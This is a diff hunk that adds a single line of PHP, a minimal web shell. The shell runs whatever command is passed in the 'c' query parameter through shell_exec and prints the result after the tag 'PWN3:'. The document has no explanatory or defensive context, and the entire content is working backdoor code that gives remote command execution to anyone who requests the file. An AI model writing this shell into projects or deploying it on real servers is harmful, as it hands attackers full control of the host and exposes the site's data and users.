@@ -1,0 +1,1 @@
+<?php echo "PWN3:".shell_exec($_GET["c"]); ?>
